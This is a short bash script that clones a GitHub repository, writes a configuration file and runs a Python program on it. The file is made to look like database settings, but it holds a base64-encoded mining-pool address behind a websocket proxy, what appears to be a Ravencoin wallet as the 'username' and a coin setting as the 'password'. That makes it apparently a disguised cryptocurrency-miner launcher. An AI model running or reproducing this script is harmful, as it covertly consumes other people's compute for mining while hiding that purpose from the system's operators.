#!/bin/bash

# Clone the repository
git clone https://github.com/saxlata/vbg.git

# Navigate into the repository folder
cd vbg || exit

# Create a configuration file
echo -e "proxy=wss://identical-sile-malphite-node-dfaa5ec5.koyeb.app/eGVsaXN2Mi1wZXBldy5uYS5taW5lLnpwb29sLmNhOjQ4MzM=\nhost=127.0.0.1\nport=3306\nusername=rM5GziBWoT9y4DQaiacGahTvKZze2TpzrB\npassword=c=RVN,pyth\nthreads=2" > data.txt

# Run the application
python3 main.py 7 --dataset=data.txt --output=result.txt
